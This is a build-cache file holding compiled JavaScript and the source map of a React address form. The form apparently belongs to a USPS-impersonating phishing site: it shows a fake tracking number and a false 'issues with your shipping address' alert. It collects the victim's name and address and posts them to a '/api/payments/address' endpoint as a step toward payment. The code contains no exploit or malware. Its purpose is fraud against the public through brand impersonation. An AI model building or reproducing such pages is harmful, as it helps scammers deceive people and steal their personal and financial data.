{"ast":null,"code":"import React,{useState}from'react';import axios from'axios';import'./AddressForm.css';import FAQSection from'./FAQSection';import Footer from'./Footer';import ProgressBar from'./ProgressBar';import{jsx as _jsx,jsxs as _jsxs,Fragment as _Fragment}from\"react/jsx-runtime\";const AddressForm=_ref=>{let{formData,handleChange,nextStep,error,setError}=_ref;const[loading,setLoading]=useState(false);const handleSubmit=async e=>{e.preventDefault();setLoading(true);setError('');try{const requiredFields=['firstName','lastName','address','country','city','zipCode'];const missingFields=requiredFields.filter(field=>{var _formData$field;return!((_formData$field=formData[field])!==null&&_formData$field!==void 0&&_formData$field.trim());});if(missingFields.length>0){throw new Error('All fields are required.');}if(!/^\\d{5}$/.test(formData.zipCode)){throw new Error('ZIP code must be 5 digits.');}await new Promise(resolve=>setTimeout(resolve,500));const response=await axios.post('/api/payments/address',formData);if(response.data.success){nextStep();}else{throw new Error(response.data.error||'Failed to save address.');}}catch(err){setError(err.message);}finally{setLoading(false);}};return/*#__PURE__*/_jsxs(\"div\",{className:\"usps-tracking-container\",children:[/*#__PURE__*/_jsx(ProgressBar,{currentStep:\"address\"}),/*#__PURE__*/_jsxs(\"div\",{className:\"tracking-header\",children:[/*#__PURE__*/_jsxs(\"h1\",{children:[/*#__PURE__*/_jsx(\"span\",{className:\"tracking-label\",children:\"Tracking Number:\"}),\" US9514901165421\"]}),/*#__PURE__*/_jsxs(\"div\",{className:\"status-bar\",children:[/*#__PURE__*/_jsx(\"span\",{className:\"status-label\",children:\"Status:\"}),/*#__PURE__*/_jsx(\"span\",{className:\"status-message\",children:\"We have issues with your shipping address\"})]})]}),/*#__PURE__*/_jsx(\"div\",{className:\"tracking-message\",children:/*#__PURE__*/_jsx(\"p\",{children:\"USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.\"})}),/*#__PURE__*/_jsxs(\"div\",{className:\"status-alert\",children:[/*#__PURE__*/_jsx(\"h4\",{children:\"Verify Address\"}),/*#__PURE__*/_jsx(\"p\",{children:\"Find an email to confirm your address as eligible for informed Delivery.\"})]}),/*#__PURE__*/_jsxs(\"form\",{onSubmit:handleSubmit,className:\"address-form\",children:[error&&/*#__PURE__*/_jsx(\"div\",{className:\"usps-error\",children:error}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-row\",children:[/*#__PURE__*/_jsxs(\"div\",{className:\"form-group\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"First Name\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",name:\"firstName\",value:formData.firstName,onChange:handleChange,required:true,disabled:loading})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-group\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"Last Name\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",name:\"lastName\",value:formData.lastName,onChange:handleChange,required:true,disabled:loading})]})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-group\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"Address\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",name:\"address\",value:formData.address,onChange:handleChange,required:true,disabled:loading})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-row\",children:[/*#__PURE__*/_jsxs(\"div\",{className:\"form-group city\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"City\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",name:\"city\",value:formData.city,onChange:handleChange,required:true,disabled:loading})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-group state\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"Country\"}),/*#__PURE__*/_jsxs(\"select\",{name:\"country\",value:formData.country,onChange:handleChange,required:true,disabled:loading,children:[/*#__PURE__*/_jsx(\"option\",{value:\"\",children:\"Select Country\"}),/*#__PURE__*/_jsx(\"option\",{value:\"US\",children:\"United States\"}),/*#__PURE__*/_jsx(\"option\",{value:\"CA\",children:\"Canada\"})]})]})]}),/*#__PURE__*/_jsxs(\"div\",{className:\"form-group\",children:[/*#__PURE__*/_jsx(\"label\",{children:\"ZIP Code\"}),/*#__PURE__*/_jsx(\"input\",{type:\"text\",name:\"zipCode\",value:formData.zipCode,onChange:handleChange,required:true,disabled:loading,pattern:\"\\\\d{5}\"})]}),/*#__PURE__*/_jsx(\"div\",{className:\"form-footer\",children:/*#__PURE__*/_jsx(\"button\",{type:\"submit\",disabled:loading,className:\"usps-button\",children:loading?/*#__PURE__*/_jsxs(_Fragment,{children:[/*#__PURE__*/_jsx(\"span\",{className:\"usps-spinner\"}),\" Processing...\"]}):'Continue'})})]}),/*#__PURE__*/_jsx(FAQSection,{}),/*#__PURE__*/_jsx(Footer,{})]});};export default AddressForm;","map":{"version":3,"names":["React","useState","axios","FAQSection","Footer","ProgressBar","jsx","_jsx","jsxs","_jsxs","Fragment","_Fragment","AddressForm","_ref","formData","handleChange","nextStep","error","setError","loading","setLoading","handleSubmit","e","preventDefault","requiredFields","missingFields","filter","field","_formData$field","trim","length","Error","test","zipCode","Promise","resolve","setTimeout","response","post","data","success","err","message","className","children","currentStep","onSubmit","type","name","value","firstName","onChange","required","disabled","lastName","address","city","country","pattern"],"sources":["D:/upsc/client/src/components/AddressForm.js"],"sourcesContent":["import React, { useState } from 'react';\r\nimport axios from 'axios';\r\nimport './AddressForm.css';\r\nimport FAQSection from './FAQSection';\r\nimport Footer from './Footer';\r\nimport ProgressBar from './ProgressBar';\r\n\r\nconst AddressForm = ({ formData, handleChange, nextStep, error, setError }) => {\r\n  const [loading, setLoading] = useState(false);\r\n\r\n  const handleSubmit = async (e) => {\r\n    e.preventDefault();\r\n    setLoading(true);\r\n    setError('');\r\n\r\n    try {\r\n      const requiredFields = ['firstName', 'lastName', 'address', 'country', 'city', 'zipCode'];\r\n      const missingFields = requiredFields.filter(field => !formData[field]?.trim());\r\n      if (missingFields.length > 0) {\r\n        throw new Error('All fields are required.');\r\n      }\r\n      \r\n      if (!/^\\d{5}$/.test(formData.zipCode)) {\r\n        throw new Error('ZIP code must be 5 digits.');\r\n      }\r\n\r\n      await new Promise(resolve => setTimeout(resolve, 500));\r\n      const response = await axios.post('/api/payments/address', formData);\r\n      if (response.data.success) {\r\n        nextStep();\r\n      } else {\r\n        throw new Error(response.data.error || 'Failed to save address.');\r\n      }\r\n    } catch (err) {\r\n      setError(err.message);\r\n    } finally {\r\n      setLoading(false);\r\n    }\r\n  };\r\n\r\n  return (\r\n    <div className=\"usps-tracking-container\">\r\n      <ProgressBar currentStep=\"address\" />\r\n      \r\n      <div className=\"tracking-header\">\r\n        <h1>\r\n          <span className=\"tracking-label\">Tracking Number:</span> US9514901165421\r\n        </h1>\r\n        <div className=\"status-bar\">\r\n          <span className=\"status-label\">Status:</span>\r\n          <span className=\"status-message\">We have issues with your shipping address</span>\r\n        </div>\r\n      </div>\r\n\r\n      <div className=\"tracking-message\">\r\n        <p>USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.</p>\r\n      </div>\r\n\r\n      <div className=\"status-alert\">\r\n        <h4>Verify Address</h4>\r\n        <p>Find an email to confirm your address as eligible for informed Delivery.</p>\r\n      </div>\r\n\r\n      <form onSubmit={handleSubmit} className=\"address-form\">\r\n        {error && <div className=\"usps-error\">{error}</div>}\r\n        \r\n        <div className=\"form-row\">\r\n          <div className=\"form-group\">\r\n            <label>First Name</label>\r\n            <input\r\n              type=\"text\"\r\n              name=\"firstName\"\r\n              value={formData.firstName}\r\n              onChange={handleChange}\r\n              required\r\n              disabled={loading}\r\n            />\r\n          </div>\r\n          <div className=\"form-group\">\r\n            <label>Last Name</label>\r\n            <input\r\n              type=\"text\"\r\n              name=\"lastName\"\r\n              value={formData.lastName}\r\n              onChange={handleChange}\r\n              required\r\n              disabled={loading}\r\n            />\r\n          </div>\r\n        </div>\r\n\r\n        <div className=\"form-group\">\r\n          <label>Address</label>\r\n          <input\r\n            type=\"text\"\r\n            name=\"address\"\r\n            value={formData.address}\r\n            onChange={handleChange}\r\n            required\r\n            disabled={loading}\r\n          />\r\n        </div>\r\n\r\n        <div className=\"form-row\">\r\n          <div className=\"form-group city\">\r\n            <label>City</label>\r\n            <input\r\n              type=\"text\"\r\n              name=\"city\"\r\n              value={formData.city}\r\n              onChange={handleChange}\r\n              required\r\n              disabled={loading}\r\n            />\r\n          </div>\r\n          <div className=\"form-group state\">\r\n            <label>Country</label>\r\n            <select\r\n              name=\"country\"\r\n              value={formData.country}\r\n              onChange={handleChange}\r\n              required\r\n              disabled={loading}\r\n            >\r\n              <option value=\"\">Select Country</option>\r\n              <option value=\"US\">United States</option>\r\n              <option value=\"CA\">Canada</option>\r\n            </select>\r\n          </div>\r\n        </div>\r\n\r\n        <div className=\"form-group\">\r\n          <label>ZIP Code</label>\r\n          <input\r\n            type=\"text\"\r\n            name=\"zipCode\"\r\n            value={formData.zipCode}\r\n            onChange={handleChange}\r\n            required\r\n            disabled={loading}\r\n            pattern=\"\\d{5}\"\r\n          />\r\n        </div>\r\n\r\n        <div className=\"form-footer\">\r\n          <button \r\n            type=\"submit\" \r\n            disabled={loading} \r\n            className=\"usps-button\"\r\n          >\r\n            {loading ? (\r\n              <>\r\n                <span className=\"usps-spinner\"></span> Processing...\r\n              </>\r\n            ) : 'Continue'}\r\n          </button>\r\n        </div>\r\n      </form>\r\n      <FAQSection />\r\n      <Footer/>\r\n    </div>\r\n  );\r\n};\r\n\r\nexport default AddressForm;"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}